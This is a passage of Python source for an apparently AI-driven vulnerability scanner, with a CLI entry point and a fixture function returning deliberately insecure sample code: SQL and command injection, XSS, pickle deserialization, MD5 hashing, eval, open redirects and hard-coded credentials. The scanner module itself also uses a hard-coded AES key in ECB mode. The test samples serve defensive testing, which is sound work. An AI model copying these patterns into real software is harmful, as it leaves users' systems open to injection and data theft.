    # Initialize scanner
    scanner = VulnerabilityScanner()
    
    # Analyze test code
    vulnerabilities = scanner.analyze_code(test_code, "test_vulnerabilities.py")
    
    # Generate and save reports
    if vulnerabilities:
        print(f"Found {len(vulnerabilities)} vulnerabilities in test code.")
        report = scanner.generate_detailed_report({"test_vulnerabilities.py": vulnerabilities})
        secure_code = scanner.generate_secure_code(test_code, vulnerabilities)
        
        # Save to current directory
        report_file, fixes_file = scanner.save_report_and_fixes(report, secure_code, os.getcwd())
        
        print(f"Test report saved to: {report_file}")
        print(f"Test fixes saved to: {fixes_file}")
    else:
        print("No vulnerabilities found in test code. This is unexpected.")
    
    return 0



# Define a 16-byte AES key (128-bit)
key = b'ThisIsASecretKey'  # Must be 16, 24, or 32 bytes

def encrypt(plaintext: str, key: bytes) -> str:
    cipher = AES.new(key, AES.MODE_ECB)
    padded = pad(plaintext.encode(), AES.block_size)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode('utf-8')  # Output as string

def decrypt(ciphertext_b64: str, key: bytes) -> str:
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted = base64.b64decode(ciphertext_b64.encode('utf-8'))
    decrypted = cipher.decrypt(encrypted)
    return unpad(decrypted, AES.block_size).decode('utf-8')

def main():
    """Main function to run the scanner."""
    parser = argparse.ArgumentParser(description='AI-powered security vulnerability scanner')
    parser.add_argument('--cli', action='store_true', help='Run in CLI mode (non-interactive)')
    parser.add_argument('--path', help='File or directory to scan (for CLI mode)')
    parser.add_argument('--model', help='Path to pre-trained model')
    parser.add_argument('--report', help='Path to save the report')
    parser.add_argument('--extensions', nargs='+', default=['.py', '.js', '.php', '.java', '.rb'],
                        help='File extensions to scan')
    args = parser.parse_args()
    
    if args.cli and args.path:
        # CLI mode
        scanner = VulnerabilityScanner(args.model)
        
        # Scan file or directory
        if os.path.isfile(args.path):
            vulnerabilities = scan_file(scanner, args.path)
            report = scanner.generate_report(vulnerabilities)
            print(report)
        elif os.path.isdir(args.path):
            results = scan_directory(scanner, args.path, args.extensions)
            
            # Generate consolidated report
            if not results:
                print("No vulnerabilities detected.")
            else:
                print(f"Vulnerabilities detected in {len(results)} files:")
                for file_path, vulnerabilities in results.items():
                    print(f"\n{file_path}:")
                    print(scanner.generate_report(vulnerabilities))
        else:
            print(f"Error: {args.path} is not a valid file or directory")
            return 1
        
        # Save report if requested
        if args.report and (results or vulnerabilities):
            with open(args.report, 'w') as f:
                if os.path.isfile(args.path):
                    f.write(scanner.generate_report(vulnerabilities))
                else:
                    for file_path, vulnerabilities in results.items():
                        f.write(f"\n{file_path}:\n")
                        f.write(scanner.generate_report(vulnerabilities))
            print(f"Report saved to {args.report}")
    else:
        # Interactive mode
        interactive_mode()
    
    return 0

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--test":
        exit(test_report())
    else:
        exit(main())

def generate_test_vulnerabilities():
    """Generate test code with common security vulnerabilities for demo purposes."""
    return """
import os
import sqlite3
import subprocess
import pickle
import hashlib
import json
import xml.dom.minidom
import requests
import random
from flask import Flask, request, redirect, session

def login(username, password):
    # SQL Injection vulnerability
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
    cursor.execute(query)
    return cursor.fetchone()

def get_logs(date):
    # Command injection vulnerability
    os.system("cat /var/log/app.log | grep " + date)

def render_profile(user_data):
    # XSS vulnerability
    template = "<div>Name: " + user_data['name'] + "</div>"
    return template

def read_file(filename):
    # Path traversal vulnerability
    with open(filename + ".txt", "r") as f:
        return f.read()
        
def store_secret():
    # Hard-coded credentials vulnerability
    api_key = "12345secret_key_here"
    password = "admin123"
    return encrypt(api_key)
    
def insecure_deserialize(data):
    # Insecure deserialization vulnerability
    return pickle.loads(data)
    
def hash_password(password):
    # Weak cryptography vulnerability
    import hashlib
    return hashlib.md5(password.encode()).hexdigest()

def process_transfer(request):
    # CSRF vulnerability - no token validation
    amount = request.POST.get('amount')
    destination = request.POST.get('destination')
    transfer_money(amount, destination)
    return "Transfer completed"

def parse_xml(xml_string):
    # XXE vulnerability
    doc = xml.dom.minidom.parseString(xml_string)
    return doc.getElementsByTagName('user')[0].firstChild.nodeValue

def verify_password(user, password):
    # Broken authentication vulnerability
    stored_pw = get_password_from_db(user)
    return password == stored_pw  # Direct comparison

def set_session_cookie(response, session_id):
    # Session hijacking vulnerability
    response.set_cookie('session', session_id)  # No secure or HttpOnly flags

def process_payment(credit_card, amount):
    # Sensitive data exposure
    print(f"Processing payment with card {credit_card} for ${amount}")
    logger.info(f"Payment processed with card {credit_card}")
    return process_with_gateway(credit_card, amount)

def redirect_after_login(request):
    # Open redirect vulnerability
    url = request.GET.get('next')
    return redirect(url)  # No validation

def update_user_DOM(user_data):
    # DOM-based XSS vulnerability
    html_code = "<div>" + user_data + "</div>"
    element.innerHTML = html_code

def setup_cors():
    # CORS misconfiguration
    app.use(cors({
        origin: '*',
        credentials: true
    }))

def process_data(user_input):
    # Poor exception management
    try:
        # Some processing
        result = 10 / user_input
        return result
    except Exception:
        pass  # Silently ignore all errors

def setup_admin():
    # Default credentials
    if not admin_exists():
        create_admin(username="admin", password="admin")

def get_user_document(request, doc_id):
    # Insecure direct object reference
    # No authorization check
    return db.get_document(doc_id)

def execute_dynamic_code(input_value):
    # Unsafe JavaScript execution
    function_name = "process_" + input_value
    eval(function_name + "()")

def save_to_local_storage(token):
    # Poor token handling
    localStorage.setItem('auth_token', token)

def rate_limited_api():
    # Improper rate limiting
    # No rate limiting implemented
    return process_sensitive_data()

def configure_app_debug():
    # Exposed debug mode
    app.debug = True
    DEBUG = True

def log_user_activity(user_data, password):
    # Logging sensitive data
    logger.info(f"User logged in with {user_data} and password {password}")

def connect_to_api():
    # Missing security headers
    headers = {
        'Content-Type': 'application/json'
        # Missing security headers
    }
    return requests.get('https://api.example.com', headers=headers)

def connect_to_mobile():
    # Insecure mobile communication
    return requests.get('http://insecure-api.example.com')

def handle_error(error):
    # Information disclosure in errors
    return {
        'error': str(error),
        'stack': error.traceback
    }

def copy_from_stackoverflow():
    # Copied insecure code
    # Copied from Stack Overflow
    password = "hardcoded"
    if password == "hardcoded":
        return "Authenticated"

# This is a function that has multiple vulnerabilities for testing
def multi_vulnerability_function(user_input, password):
    # SQL Injection
    query = "SELECT * FROM users WHERE name = '" + user_input + "'"
    
    # Command Injection
    os.system("echo " + user_input)
    
    # XSS
    html = "<div>" + user_input + "</div>"
    
    # Hard-coded credentials
    api_key = "1234-abcd-5678-efgh"
    
    # Weak cryptography
    hashed = hashlib.md5(password.encode()).hexdigest()
    
    return "Processed"
"""